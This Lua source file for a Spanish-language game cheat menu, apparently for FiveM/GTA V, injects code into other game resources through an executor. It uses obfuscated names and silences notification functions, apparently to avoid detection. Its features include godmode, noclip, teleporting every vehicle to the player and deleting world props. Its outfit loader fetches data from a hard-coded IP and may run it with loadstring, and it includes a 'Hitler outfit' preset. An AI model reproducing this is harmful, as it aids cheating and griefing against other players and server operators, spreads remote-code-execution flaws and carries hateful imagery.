if Actions.giveRampWallItem and Actions.giveRampWallItem.type == "selector" then
    Actions.giveRampWallItem.onClick = function(index, option)
        if index == 1 then
            RampVehicle()
        elseif index == 2 then
            WallVehicle()
        elseif index == 3 then
            Wall2Vehicle()
        end
    end
end

Actions.rainbowPaintItem = FindItem("Vehiculo", "Rendimiento", "Pintura arcoiris")
if Actions.rainbowPaintItem then
    Actions.rainbowPaintItem.onClick = function(value)
        ToggleRainbowPaint(value)
    end
end

Actions.noCollisionItem = FindItem("Vehiculo", "Rendimiento", "Sin colisiones")
if Actions.noCollisionItem then
    Actions.noCollisionItem.onClick = function(value)
        ToggleNoCollision(value)
    end
end

Actions.bunnyHopItem = FindItem("Vehiculo", "Rendimiento", "Salto de conejo")
if Actions.bunnyHopItem then
    Actions.bunnyHopItem.onClick = function(value)
        ToggleBunnyHop(value)
    end
end

Actions.backFlipItem = FindItem("Vehiculo", "Rendimiento", "Salto hacia atras")
if Actions.backFlipItem then
    Actions.backFlipItem.onClick = function(value)
        ToggleBackFlip(value)
    end
end

Actions.shiftBoostItem = FindItem("Vehiculo", "Rendimiento", "Boost con Shift")
if Actions.shiftBoostItem then
    Actions.shiftBoostItem.onClick = function(value)
        ToggleShiftBoost(value)
    end
end

local function ToggleGravitateVehicle(enable, speed)
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end

    if enable then
        speed = speed or 100
        local injectionCode = [[
            if PqLmYgZxWvTrHs == nil then PqLmYgZxWvTrHs = false end
            PqLmYgZxWvTrHs = true

            VehicleSpeed = 0.0
            VehicleMaxSpeed = ]] .. tostring(speed) .. [[.0
            VehicleMinSpeed = 1.0
            VehicleSpeedMultiplier = 1.0
            VehicleBaseSpeed = ]] .. tostring(speed) .. [[.0
            VehicleAcceleration = ]] .. tostring(math.max(1.0, speed / 100.0)) .. [[
            VehicleFollowCamera = true
            VerticalFlyingEnabled = true

            local player = PlayerPedId()
            local vehicle = GetVehiclePedIsIn(player, false)
            if vehicle and vehicle ~= 0 then
                SetVehicleGravityAmount(vehicle, 9.8)
                if IsEntityPositionFrozen(vehicle) then
                    FreezeEntityPosition(vehicle, false)
                end
                SetVehicleFixed(vehicle)
            end

            local function NormalizeVector(x, y, z)
                local length = math.sqrt(x*x + y*y + z*z)
                if length > 0 then
                    return x/length, y/length, z/length
                else
                    return 0.0, 0.0, 0.0
                end
            end

            local function DegToRad(deg)
                return deg * math.pi / 180.0
            end

            local function VkEyTrXpZdQl()
                SetTextEntry = function() end
                AddTextComponentString = function() end
                DrawNotification = function() return false end
                BeginTextCommandDisplayText = function() end
                EndTextCommandDisplayText = function() end
                AddTextComponentSubstringPlayerName = function() end

                CreateThread(function()
                    local lastKeyPress = 0
                    local helpShown = false
                    local activeControls = false
                    local lastVehicle = nil

                    while PqLmYgZxWvTrHs do
                        local PlayerPedIdFunc = PlayerPedId
                        local GetVehiclePedIsInFunc = GetVehiclePedIsIn
                        local SetVehicleGravityAmountFunc = SetVehicleGravityAmount
                        local SetEntityRotationFunc = SetEntityRotation
                        local GetEntityRotationFunc = GetEntityRotation
                        local FreezeEntityPositionFunc = FreezeEntityPosition
                        local GetGameCamRotFunc = GetGameplayCamRot
                        local SetEntityVelocityFunc = SetEntityVelocity

                        local player = PlayerPedIdFunc()
                        local vehicle = GetVehiclePedIsInFunc(player, false)

                        if vehicle ~= lastVehicle then
                            if lastVehicle and lastVehicle ~= 0 then
                                SetVehicleGravityAmountFunc(lastVehicle, 9.8)
                                SetVehicleFixed(lastVehicle)
                                NetworkRequestControlOfEntity(lastVehicle)
                                if IsEntityPositionFrozen(lastVehicle) then
                                    FreezeEntityPosition(lastVehicle, false)
                                end
                                ModifyVehicleTopSpeed(lastVehicle, 1.0)
                                SetVehicleHandlingFloat(lastVehicle, "CHandlingData", "fMass", 1500.0)
                                SetVehicleHandlingFloat(lastVehicle, "CHandlingData", "fInitialDragCoeff", 10.0)
                                SetVehicleHandlingFloat(lastVehicle, "CHandlingData", "fDriveBiasFront", 0.5)
                                SetVehicleOnGroundProperly(lastVehicle)
                                SetEntityVelocity(lastVehicle, 0.0, 0.0, 0.0)
                            end

                            if vehicle and vehicle ~= 0 then
                                SetVehicleGravityAmountFunc(vehicle, 9.8)
                                SetVehicleFixed(vehicle)
                                NetworkRequestControlOfEntity(vehicle)
                                if not activeControls then
                                    ModifyVehicleTopSpeed(vehicle, 1.0)
                                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fMass", 1500.0)
                                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fInitialDragCoeff", 10.0)
                                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fDriveBiasFront", 0.5)
                                end
                            end

                            lastVehicle = vehicle
                        end

                        if vehicle and vehicle ~= 0 then
                            local shiftPressed = IsControlPressed(0, 21)
                            if shiftPressed and not activeControls then
                                activeControls = true
                            elseif not shiftPressed and activeControls then
                                activeControls = false
                                SetVehicleGravityAmountFunc(vehicle, 9.8)
                                SetEntityVelocityFunc(vehicle, 0.0, 0.0, 0.0)
                                SetVehicleFixed(vehicle)
                                SetVehicleEngineOn(vehicle, true, true, false)
                                ModifyVehicleTopSpeed(vehicle, 1.0)
                                SetVehicleHandlingFloat(vehicle, "CHandlingData", "fMass", 1500.0)
                                SetVehicleHandlingFloat(vehicle, "CHandlingData", "fInitialDragCoeff", 10.0)
                                SetVehicleHandlingFloat(vehicle, "CHandlingData", "fDriveBiasFront", 0.5)
                                if not IsVehicleOnAllWheels(vehicle) and GetEntitySpeed(vehicle) < 0.5 then
                                    SetVehicleOnGroundProperly(vehicle)
                                end
                                lastKeyPress = GetGameTimer()
                            end

                            if IsControlJustPressed(0, 15) then
                                VehicleSpeedMultiplier = math.min(VehicleSpeedMultiplier + 0.5, 10.0)
                                lastKeyPress = GetGameTimer()
                            end

                            if IsControlJustPressed(0, 14) then
                                VehicleSpeedMultiplier = math.max(VehicleSpeedMultiplier - 0.5, 0.1)
                                lastKeyPress = GetGameTimer()
                            end

                            for i = 1, 9 do
                                if IsControlJustPressed(0, 48 + i) then
                                    VehicleMaxSpeed = (VehicleBaseSpeed / 10.0) * i * VehicleSpeedMultiplier
                                    lastKeyPress = GetGameTimer()
                                end
                            end

                            if IsControlJustPressed(0, 48) then
                                VehicleMaxSpeed = 0.0
                                VehicleSpeed = 0.0
                                lastKeyPress = GetGameTimer()
                            end

                            if IsControlJustPressed(0, 19) then
                                SetVehicleGravityAmountFunc(vehicle, 9.8)
                                SetVehicleFixed(vehicle)
                                SetEntityVelocityFunc(vehicle, 0.0, 0.0, 0.0)
                                SetVehicleOnGroundProperly(vehicle)
                                SetEntityRotationFunc(vehicle, 0.0, 0.0, GetEntityHeading(vehicle), 2, true)
                                ModifyVehicleTopSpeed(vehicle, 1.0)
                                SetVehicleHandlingFloat(vehicle, "CHandlingData", "fMass", 1500.0)
                                SetVehicleHandlingFloat(vehicle, "CHandlingData", "fInitialDragCoeff", 10.0)
                                SetVehicleHandlingFloat(vehicle, "CHandlingData", "fDriveBiasFront", 0.5)
                                SetVehicleEngineHealth(vehicle, 1000.0)
                                SetVehicleEngineOn(vehicle, true, true, false)
                                SetVehicleUndriveable(vehicle, false)
                                activeControls = false
                                VehicleSpeed = 0.0
                                lastKeyPress = GetGameTimer()
                            end

                            if not helpShown then
                                lastKeyPress = GetGameTimer()
                                helpShown = true
                            end

                            local camRotation = GetGameCamRotFunc(0)
                            local camPitch = DegToRad(camRotation.x)
                            local camYaw = DegToRad(camRotation.z)

                            local lookDirection = {
                                x = -math.sin(camYaw) * math.cos(camPitch),
                                y = math.cos(camYaw) * math.cos(camPitch),
                                z = math.sin(camPitch)
                            }

                            if activeControls then
                                if IsControlPressed(0, 32) then
                                    VehicleSpeed = math.min(VehicleSpeed + VehicleAcceleration, VehicleMaxSpeed)
                                elseif IsControlPressed(0, 33) then
                                    VehicleSpeed = math.max(VehicleSpeed - VehicleAcceleration * 2, -VehicleMaxSpeed / 2)
                                else
                                    if VehicleSpeed > 0 then
                                        VehicleSpeed = math.max(0, VehicleSpeed - VehicleAcceleration * 0.5)
                                    elseif VehicleSpeed < 0 then
                                        VehicleSpeed = math.min(0, VehicleSpeed + VehicleAcceleration * 0.5)
                                    end
                                end
                            else
                                if IsControlPressed(0, 32) then
                                    VehicleSpeed = math.min(VehicleSpeed + VehicleAcceleration * 0.5, VehicleMaxSpeed / 2)
                                elseif IsControlPressed(0, 33) then
                                    VehicleSpeed = math.max(VehicleSpeed - VehicleAcceleration, -VehicleMaxSpeed / 4)
                                else
                                    if VehicleSpeed > 0 then
                                        VehicleSpeed = math.max(0, VehicleSpeed - VehicleAcceleration * 0.75)
                                    elseif VehicleSpeed < 0 then
                                        VehicleSpeed = math.min(0, VehicleSpeed + VehicleAcceleration * 0.75)
                                    end
                                end
                                SetVehicleGravityAmountFunc(vehicle, 9.8)
                                SetVehicleHandlingFloat(vehicle, "CHandlingData", "fMass", 1500.0)
                                SetVehicleHandlingFloat(vehicle, "CHandlingData", "fInitialDragCoeff", 10.0)
                            end

                            local directionX, directionY, directionZ

                            if VehicleFollowCamera then
                                directionX = lookDirection.x
                                directionY = lookDirection.y
                                directionZ = lookDirection.z

                                if activeControls then
                                    local camRot = GetGameCamRotFunc(0)
                                    local targetHeading = camRot.z
                                    SetEntityHeading(vehicle, targetHeading)
                                end
                            else
                                local camRotation = GetGameCamRotFunc(0)
                                local camYaw = DegToRad(camRotation.z)
                                directionX = -math.sin(camYaw)
                                directionY = math.cos(camYaw)
                                directionZ = 0.0
                            end

                            if activeControls then
                                if IsControlPressed(0, 44) then
                                    directionZ = directionZ + 0.5
                                end
                            end

                            if IsControlJustPressed(0, 45) then
                                local coords = GetEntityCoords(player)
                                SetEntityCoords(vehicle, coords.x, coords.y, coords.z + 1.0, false, false, false, false)
                                SetEntityRotationFunc(vehicle, 0.0, 0.0, 0.0, 2, true)
                                SetEntityVelocityFunc(vehicle, 0.0, 0.0, 0.0)
                                VehicleSpeed = 0.0
                                lastKeyPress = GetGameTimer()
                            end

                            if IsControlJustPressed(0, 23) then
                                if IsPedInAnyVehicle(player, false) then
                                    SetVehicleGravityAmountFunc(vehicle, 9.8)
                                    TaskLeaveVehicle(player, vehicle, 16)
                                else
                                    if not activeControls then
                                        SetVehicleGravityAmountFunc(vehicle, 9.8)
                                        SetVehicleFixed(vehicle)
                                    end
                                    TaskWarpPedIntoVehicle(player, vehicle, -1)
                                end
                                lastKeyPress = GetGameTimer()
                            end

                            if IsControlJustPressed(0, 29) then
                                VerticalFlyingEnabled = not VerticalFlyingEnabled
                                if VerticalFlyingEnabled then
                                    PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                                else
                                    PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                                end
                                lastKeyPress = GetGameTimer()
                            end

                            if IsEntityPositionFrozen(vehicle) then
                                FreezeEntityPositionFunc(vehicle, false)
                            end

                            if activeControls then
                                SetVehicleGravityAmountFunc(vehicle, 0.0)

                                local camRot = GetGameplayCamRot(0)
                                local camYaw = camRot.z

                                local currentRot = GetEntityRotationFunc(vehicle, 2)
                                local angleDiff = ((camYaw - currentRot.z + 180) % 360) - 180
                                local newHeading = currentRot.z + (angleDiff * 0.1)
                                SetEntityRotationFunc(vehicle, 0.0, 0.0, newHeading, 2, true)

                                if VehicleSpeed ~= 0 then
                                    local camRadians = math.rad(camYaw)
                                    local dirX = -math.sin(camRadians)
                                    local dirY = math.cos(camRadians)
                                    local dirZ = 0.0

                                    if VerticalFlyingEnabled then
                                        dirZ = lookDirection.z * 1.5
                                    end

                                    if IsControlPressed(0, 44) then
                                        dirZ = 1.0
                                    end

                                    local dx, dy, dz = NormalizeVector(dirX, dirY, dirZ)

                                    if VerticalFlyingEnabled then
                                        dz = dz * 1.5
                                        local magnitude = math.sqrt(dx*dx + dy*dy + dz*dz)
                                        if magnitude > 0 then
                                            dx = dx / magnitude
                                            dy = dy / magnitude
                                            dz = dz / magnitude
                                        end
                                    end

                                    local speedMult = VehicleSpeedMultiplier or 1.0

                                    SetEntityVelocityFunc(vehicle,
                                        dx * VehicleSpeed * speedMult,
                                        dy * VehicleSpeed * speedMult,
                                        dz * VehicleSpeed * speedMult
                                    )
                                end
                            else
                                SetVehicleGravityAmountFunc(vehicle, 9.8)
                                local handlingNeedsReset = false

                                local currentMass = GetVehicleHandlingFloat(vehicle, "CHandlingData", "fMass")
                                local currentDrag = GetVehicleHandlingFloat(vehicle, "CHandlingData", "fInitialDragCoeff")

                                if currentMass < 100.0 or currentMass > 3000.0 or
                                   currentDrag < 1.0 or currentDrag > 20.0 then
                                    handlingNeedsReset = true
                                end

                                if handlingNeedsReset then
                                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fMass", 1500.0)
                                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fInitialDragCoeff", 10.0)
                                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fDriveBiasFront", 0.5)
                                    ModifyVehicleTopSpeed(vehicle, 1.0)
                                end
                            end
                        end
                        Wait(0)
                    end
                end)
            end

            VkEyTrXpZdQl()
        ]]

        Susano.InjectResource("any", injectionCode)
    else
        local injectionCode = [[
            PqLmYgZxWvTrHs = false

            local player = PlayerPedId()
            local playerPos = GetEntityCoords(player)

            local vehicle = GetVehiclePedIsIn(player, false)
            if vehicle and vehicle ~= 0 then
                SetVehicleGravityAmount(vehicle, 9.8)
                if IsEntityPositionFrozen(vehicle) then
                    FreezeEntityPosition(vehicle, false)
                end
                SetVehicleFixed(vehicle)
                SetVehicleEngineOn(vehicle, true, true, false)
                local speed = GetEntitySpeed(vehicle)
                if speed < 0.1 then
                    SetEntityVelocity(vehicle, 0.0, 0.0, 0.0)
                end
            end

            local vehicles = GetGamePool('CVehicle')
            for _, veh in ipairs(vehicles) do
                if veh ~= 0 and veh ~= vehicle then
                    local vehPos = GetEntityCoords(veh)
                    local dist = #(playerPos - vehPos)
                    if dist < 100.0 then
                        SetVehicleGravityAmount(veh, 9.8)
                        if IsEntityPositionFrozen(veh) then
                            FreezeEntityPosition(veh, false)
                        end
                        SetVehicleFixed(veh)
                    end
                end
            end
        ]]

        Susano.InjectResource("any", injectionCode)
    end
end

Actions.gravitateVehicleItem = FindItem("Vehiculo", "Rendimiento", "Vehiculo gravitatorio")
Actions.gravitateSpeedItem = FindItem("Vehiculo", "Rendimiento", "Velocidad gravitatoria")

if Actions.gravitateVehicleItem then
    Actions.gravitateVehicleItem.onClick = function(value)
        local speed = 100
        if Actions.gravitateSpeedItem and Actions.gravitateSpeedItem.value then
            speed = Actions.gravitateSpeedItem.value
        end
        ToggleGravitateVehicle(value, speed)
    end
end

if Actions.gravitateSpeedItem then
    Actions.gravitateSpeedItem.onClick = function(value)
        if Actions.gravitateVehicleItem and Actions.gravitateVehicleItem.value then
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", [[
                    if PqLmYgZxWvTrHs then
                        VehicleMaxSpeed = ]] .. tostring(value) .. [[.0
                        VehicleBaseSpeed = ]] .. tostring(value) .. [[.0
                        VehicleAcceleration = ]] .. tostring(math.max(1.0, value / 100.0)) .. [[
                    end
                ]])
            end
        end
    end
end

Actions.godmodeItem = FindItem("Jugador", "Personal", "Inmortal")
if Actions.godmodeItem then
    Actions.godmodeItem.onClick = function(value)
        ToggleFullGodmode(value)
    end
end

Actions.semiGodmodeItem = FindItem("Jugador", "Personal", "Semi-inmortal")
if Actions.semiGodmodeItem then
    Actions.semiGodmodeItem.onClick = function(value)
        ToggleSemiGodmode(value)
    end
end

Actions.antiHeadshotItem = FindItem("Jugador", "Personal", "Anti Cabeza")
if Actions.antiHeadshotItem then
    Actions.antiHeadshotItem.onClick = function(value)
        ToggleAntiHeadshot(value)
    end
end

Actions.noclipItem = FindItem("Jugador", "Movimiento", "Noclip")
if Actions.noclipItem then
    Actions.noclipItem.onClick = function(value)
        local speed = Actions.noclipItem.sliderValue or 1.0

        if value then
            if noclipType == "normal" then
                ToggleNoclipStaff(false)
                Wait(50)
                ToggleNoclip(true, speed)
            else
                ToggleNoclip(false, speed)
                Wait(50)
                ToggleNoclipStaff(true)
            end
        else
            if noclipType == "normal" then
                ToggleNoclip(false, speed)
            else
                ToggleNoclipStaff(false)
            end
        end

        lastNoclipSpeed = speed
    end
end

Actions.noclipTypeItem = FindItem("Jugador", "Movimiento", "Tipo Noclip")
if Actions.noclipTypeItem then
    Actions.noclipTypeItem.onClick = function(index, option)
        local oldType = noclipType
        noclipType = option

        if Actions.noclipItem and Actions.noclipItem.value then
            local speed = Actions.noclipItem.sliderValue or 1.0

            if oldType == "normal" then
                ToggleNoclip(false, speed)
            else
                ToggleNoclipStaff(false)
            end

            Wait(100)

            if noclipType == "normal" then
                ToggleNoclip(true, speed)
            else
                ToggleNoclipStaff(true)
            end
        end
    end
end

Actions.tpAllVehiclesItem = FindItem("Jugador", "Personal", "TP todos los vehiculos a mi")
if Actions.tpAllVehiclesItem then
    Actions.tpAllVehiclesItem.onClick = function()
        Menu.ActionTPAllVehiclesToMe()
    end
end

Actions.reviveItem = FindItem("Jugador", "Revive", "Revivir")
if Actions.reviveItem then
    Actions.reviveItem.onClick = function()
        Menu.ActionRevive()
    end
end

Actions.maxHealthItem = FindItem("Jugador", "Personal", "Salud Maxima")
if Actions.maxHealthItem then
    Actions.maxHealthItem.onClick = function()
        Menu.ActionMaxHealth()
    end
end

Actions.maxArmorItem = FindItem("Jugador", "Personal", "Armadura Maxima")
if Actions.maxArmorItem then
    Actions.maxArmorItem.onClick = function()
        Menu.ActionMaxArmor()
    end
end

Actions.detachItem = FindItem("Jugador", "Personal", "Desenganchar todas las entidades")
if Actions.detachItem then
    Actions.detachItem.onClick = function()
        Menu.ActionDetachAllEntitys()
    end
end

Actions.soloSessionItem = FindItem("Jugador", "Personal", "Sesion Solitaria")
if Actions.soloSessionItem then
    Actions.soloSessionItem.onClick = function(value)
        ToggleSoloSession(value)
    end
end

Actions.throwVehicleItem = FindItem("Jugador", "Personal", "Lanzar vehiculo")
if Actions.throwVehicleItem then
    Actions.throwVehicleItem.onClick = function(value)
        ToggleThrowVehicle(value)
    end
end

Actions.fastRunItem = FindItem("Jugador", "Movimiento", "Correr rapido")
if Actions.fastRunItem then
    Actions.fastRunItem.onClick = function(value)
        ToggleFastRun(value)
    end
end

Actions.noRagdollItem = FindItem("Jugador", "Movimiento", "Sin caidas")
if Actions.noRagdollItem then
    Actions.noRagdollItem.onClick = function(value)
        ToggleNoRagdoll(value)
    end
end

Actions.tinyPlayerItem = FindItem("Jugador", "Personal", "Jugador pequeno")
if Actions.tinyPlayerItem then
    Actions.tinyPlayerItem.onClick = function(value)
        ToggleTinyPlayer(value)
    end
end

Actions.infiniteStaminaItem = FindItem("Jugador", "Personal", "Resistencia infinita")
if Actions.infiniteStaminaItem then
    Actions.infiniteStaminaItem.onClick = function(value)
        ToggleInfiniteStamina(value)
    end
end

Actions.deleteAllPropsItem = FindItem("Visuales", "Mundo", "Eliminar todos los props")
if Actions.deleteAllPropsItem then
    Actions.deleteAllPropsItem.onClick = function()
        DeleteAllProps()
    end
end

Actions.randomOutfitItem = FindItem("Jugador", "Ropero", "Atuendo aleatorio")
if Actions.randomOutfitItem then
    Actions.randomOutfitItem.onClick = function()
        Menu.ActionRandomOutfit()
    end
end

local function SimpleJsonEncodeOutfit(tbl, indent)
    indent = indent or 0
    local result = {}
    local isArray = true
    local maxIndex = 0

    for k, v in pairs(tbl) do
        if type(k) ~= "number" then
            isArray = false
            break
        end
        if k > maxIndex then maxIndex = k end
    end

    if maxIndex ~= #tbl then isArray = false end

    for k, v in pairs(tbl) do
        local key
        if isArray then
            key = ""
        else
            key = type(k) == "string" and '"' .. string.gsub(k, '"', '\\"') .. '"' or tostring(k)
        end

        local value
        if type(v) == "table" then
            value = SimpleJsonEncodeOutfit(v, indent + 1)
        elseif type(v) == "string" then
            value = '"' .. string.gsub(v, '"', '\\"') .. '"'
        elseif type(v) == "boolean" then
            value = v and "true" or "false"
        elseif type(v) == "number" then
            value = tostring(v)
        else
            value = '"' .. tostring(v) .. '"'
        end

        if isArray then
            table.insert(result, value)
        else
            table.insert(result, key .. ":" .. value)
        end
    end

    if isArray then
        return "[" .. table.concat(result, ",") .. "]"
    else
        return "{" .. table.concat(result, ",") .. "}"
    end
end

local function CollectCurrentOutfit()
    local ped = PlayerPedId()
    if not ped or not DoesEntityExist(ped) then
        return nil
    end

    local outfit = {}

    local shapeFirst, shapeSecond, shapeThird, skinFirst, skinSecond, skinThird, shapeMix, skinMix, thirdMix = GetPedHeadBlendData(ped)
    outfit.sex = shapeFirst or 0
    outfit.face = shapeFirst or 0
    outfit.skin = skinFirst or 0

    outfit.hair_1 = GetPedDrawableVariation(ped, 2) or 0
    outfit.hair_2 = GetPedTextureVariation(ped, 2) or 0
    local hairColor, highlightColor = GetPedHairColor(ped)
    outfit.hair_color_1 = hairColor or 0
    outfit.hair_color_2 = highlightColor or 0

    outfit.decals_1 = GetPedDrawableVariation(ped, 10) or 0
    outfit.decals_2 = GetPedTextureVariation(ped, 10) or 0
    outfit.tshirt_1 = GetPedDrawableVariation(ped, 8) or 0
    outfit.tshirt_2 = GetPedTextureVariation(ped, 8) or 0
    outfit.torso_1 = GetPedDrawableVariation(ped, 11) or 0
    outfit.torso_2 = GetPedTextureVariation(ped, 11) or 0
    outfit.arms = GetPedDrawableVariation(ped, 3) or 0
    outfit.pants_1 = GetPedDrawableVariation(ped, 4) or 0
    outfit.pants_2 = GetPedTextureVariation(ped, 4) or 0
    outfit.shoes_1 = GetPedDrawableVariation(ped, 6) or 0
    outfit.shoes_2 = GetPedTextureVariation(ped, 6) or 0
    outfit.mask_1 = GetPedDrawableVariation(ped, 1) or 0
    outfit.mask_2 = GetPedTextureVariation(ped, 1) or 0
    outfit.bproof_1 = GetPedDrawableVariation(ped, 9) or 0
    outfit.bproof_2 = GetPedTextureVariation(ped, 9) or 0
    outfit.bags_1 = GetPedDrawableVariation(ped, 5) or 0
    outfit.bags_2 = GetPedTextureVariation(ped, 5) or 0

    local helmetProp = GetPedPropIndex(ped, 0)
    outfit.helmet_1 = (helmetProp ~= -1) and helmetProp or 0
    outfit.helmet_2 = (helmetProp ~= -1) and GetPedPropTextureIndex(ped, 0) or 0

    local glassesProp = GetPedPropIndex(ped, 1)
    outfit.glasses_1 = (glassesProp ~= -1) and glassesProp or 0
    outfit.glasses_2 = (glassesProp ~= -1) and GetPedPropTextureIndex(ped, 1) or 0

    outfit.beard_1 = 0
    outfit.beard_2 = 0
    outfit.beard_3 = 0
    outfit.beard_4 = 0

    outfit.chain_1 = GetPedDrawableVariation(ped, 7) or 0
    outfit.chain_2 = GetPedTextureVariation(ped, 7) or 0

    return outfit
end

Actions.saveOutfitItem = FindItem("Jugador", "Ropero", "Guardar atuendo")
if Actions.saveOutfitItem then
    Actions.saveOutfitItem.onClick = function()
        if Menu and Menu.OpenInput then
            Menu.OpenInput("Guardar atuendo", "Introduce un codigo para tu atuendo:", function(code)
                if not code or code == "" then return end

                code = string.lower(string.gsub(code, "%s+", ""))

                local outfit = CollectCurrentOutfit()

                if not outfit then
                    if Menu and Menu.OpenInput then
                        Menu.OpenInput("Error", "No se pudo recopilar el atuendo", function() end)
                    end
                    return
                end

                CreateThread(function()
                    local jsonData = SimpleJsonEncodeOutfit({ code = code, outfit = outfit })
                    local baseUrl = "http://82.22.7.19:25010"

                    if type(Susano) == "table" and type(Susano.HttpGet) == "function" then
                        local encodedData = ""
                        for i = 1, #jsonData do
                            local byte = string.byte(jsonData, i)
                            if (byte >= 48 and byte <= 57) or (byte >= 65 and byte <= 90) or (byte >= 97 and byte <= 122) or byte == 45 or byte == 95 or byte == 46 or byte == 126 then
                                encodedData = encodedData .. string.char(byte)
                            else
                                encodedData = encodedData .. string.format("%%%02X", byte)
                            end
                        end

                        local getUrl = baseUrl .. "/outfit/save?data=" .. encodedData
                        local status, response = Susano.HttpGet(getUrl)

                        if status == 200 then
                            if Menu and Menu.OpenInput then
                                Menu.OpenInput("Exito", "¡Atuendo guardado correctamente!", function() end)
                            end
                        else
                            if Menu and Menu.OpenInput then
                                Menu.OpenInput("Error", "Fallo al guardar el atuendo. Estado: " .. tostring(status), function() end)
                            end
                        end
                    else
                        if Menu and Menu.OpenInput then
                            Menu.OpenInput("Error", "Funciones HTTP no disponibles", function() end)
                        end
                    end
                end)
            end)
        end
    end
end

local function ApplyOutfit(outfit)
    if not outfit then return false end

    local ped = PlayerPedId()
    if not ped or not DoesEntityExist(ped) then
        return false
    end

    if TriggerEvent then
        TriggerEvent('skinchanger:loadSkin', outfit)
    end

    CreateThread(function()
        Wait(100)

        if outfit.face and outfit.skin then
            SetPedHeadBlendData(ped, outfit.face or 0, outfit.face or 0, 0, outfit.skin or 0, outfit.skin or 0, 0, 1.0, 1.0, 0.0, false)
        end

        if outfit.hair_1 then
            SetPedComponentVariation(ped, 2, outfit.hair_1, outfit.hair_2 or 0, 0)
        end
        if outfit.hair_color_1 then
            SetPedHairColor(ped, outfit.hair_color_1 or 0, outfit.hair_color_2 or 0)
        end

        if outfit.decals_1 then SetPedComponentVariation(ped, 10, outfit.decals_1, outfit.decals_2 or 0, 0) end
        if outfit.tshirt_1 then SetPedComponentVariation(ped, 8, outfit.tshirt_1, outfit.tshirt_2 or 0, 0) end
        if outfit.torso_1 then SetPedComponentVariation(ped, 11, outfit.torso_1, outfit.torso_2 or 0, 0) end
        if outfit.arms then SetPedComponentVariation(ped, 3, outfit.arms, 0, 0) end
        if outfit.pants_1 then SetPedComponentVariation(ped, 4, outfit.pants_1, outfit.pants_2 or 0, 0) end
        if outfit.shoes_1 then SetPedComponentVariation(ped, 6, outfit.shoes_1, outfit.shoes_2 or 0, 0) end
        if outfit.mask_1 then SetPedComponentVariation(ped, 1, outfit.mask_1, outfit.mask_2 or 0, 0) end
        if outfit.bproof_1 then SetPedComponentVariation(ped, 9, outfit.bproof_1, outfit.bproof_2 or 0, 0) end
        if outfit.bags_1 then SetPedComponentVariation(ped, 5, outfit.bags_1, outfit.bags_2 or 0, 0) end
        if outfit.chain_1 then SetPedComponentVariation(ped, 7, outfit.chain_1, outfit.chain_2 or 0, 0) end

        if outfit.helmet_1 and outfit.helmet_1 > 0 then
            SetPedPropIndex(ped, 0, outfit.helmet_1, outfit.helmet_2 or 0, true)
        else
            ClearPedProp(ped, 0)
        end

        if outfit.glasses_1 and outfit.glasses_1 > 0 then
            SetPedPropIndex(ped, 1, outfit.glasses_1, outfit.glasses_2 or 0, true)
        else
            ClearPedProp(ped, 1)
        end
    end)

    return true
end

Actions.loadOutfitItem = FindItem("Jugador", "Ropero", "Cargar atuendo")
if Actions.loadOutfitItem then
    Actions.loadOutfitItem.onClick = function()
        if Menu and Menu.OpenInput then
            Menu.OpenInput("Cargar atuendo", "Introduce el codigo del atuendo:", function(code)
                if not code or code == "" then return end

                code = string.lower(string.gsub(code, "%s+", ""))

                if type(Susano) == "table" and type(Susano.HttpGet) == "function" then
                    CreateThread(function()
                        local status, response = Susano.HttpGet("http://82.22.7.19:25010/outfit/load?code=" .. code)

                        if status == 200 and response then
                            if type(response) ~= "string" then
                                response = tostring(response)
                            end

                            local success, data, parseErr = pcall(function()
                                if json and type(json.decode) == "function" then
                                    return json.decode(response)
                                elseif loadstring then
                                    local func = loadstring("return " .. response)
                                    if func then
                                        return func()
                                    end
                                end
                                return nil
                            end)

                            if not success then
                                parseErr = data
                                data = nil
                            end

                            if success and data then
                                local outfitToApply = data.outfit or data
                                if outfitToApply and type(outfitToApply) == "table" then
                                    Wait(100)

                                    local applySuccess = ApplyOutfit(outfitToApply)

                                    if not applySuccess then
                                        if Menu and Menu.OpenInput then
                                            Menu.OpenInput("Error", "Fallo al aplicar el atuendo", function() end)
                                        end
                                    end
                                else
                                    if Menu and Menu.OpenInput then
                                        Menu.OpenInput("Error", "Formato de atuendo invalido", function() end)
                                    end
                                end
                            else
                                if Menu and Menu.OpenInput then
                                    Menu.OpenInput("Error", "Fallo al parsear el atuendo: " .. tostring(parseErr or "Error desconocido"), function() end)
                                end
                            end
                        elseif status == 404 then
                            if Menu and Menu.OpenInput then
                                Menu.OpenInput("Error", "¡Atuendo no encontrado!", function() end)
                            end
                        else
                            if Menu and Menu.OpenInput then
                                Menu.OpenInput("Error", "Fallo al cargar el atuendo. Estado: " .. tostring(status), function() end)
                            end
                        end
                    end)
                else
                    if Menu and Menu.OpenInput then
                        Menu.OpenInput("Error", "Funciones HTTP no disponibles", function() end)
                    end
                end
            end)
        end
    end
end

function Menu.ActionHitlerOutfit()
    TriggerEvent('skinchanger:loadSkin', {
        sex          = 0,
        face         = 13,
        skin         = 1,
        hair_1       = 18,
        hair_2       = 0,
        hair_color_1 = 0,
        hair_color_2 = 0,
        decals_1     = 0,
        decals_2     = 0,
        tshirt_1     = 10,
        tshirt_2     = 0,
        torso_1      = 72,
        torso_2      = 1,
        arms         = 33,
        pants_1      = 24,
        pants_2      = 1,
        shoes_1      = 38,
        shoes_2      = 0,
        mask_1       = 0,
        mask_2       = 0,
        helmet_1     = 113,
        helmet_2     = 0,
        bproof_1     = 0,
        bproof_2     = 0,
        bags_1       = 0,
        bags_2       = 0,
        beard_1      = 9,
        beard_2      = 10,
        beard_3      = 0,
        beard_4      = 0,
        chain_1      = 38,
        chain_2      = 0,
        glasses_1    = 0,
        glasses_2    = 0,
    })
end

function Menu.ActionStaffOutfit()
    TriggerEvent('skinchanger:loadSkin', {
        sex          = 0,
        face         = 1,
        skin         = 1,
        hair_1       = 1,
        hair_2       = 0,
        hair_color_1 = 0,
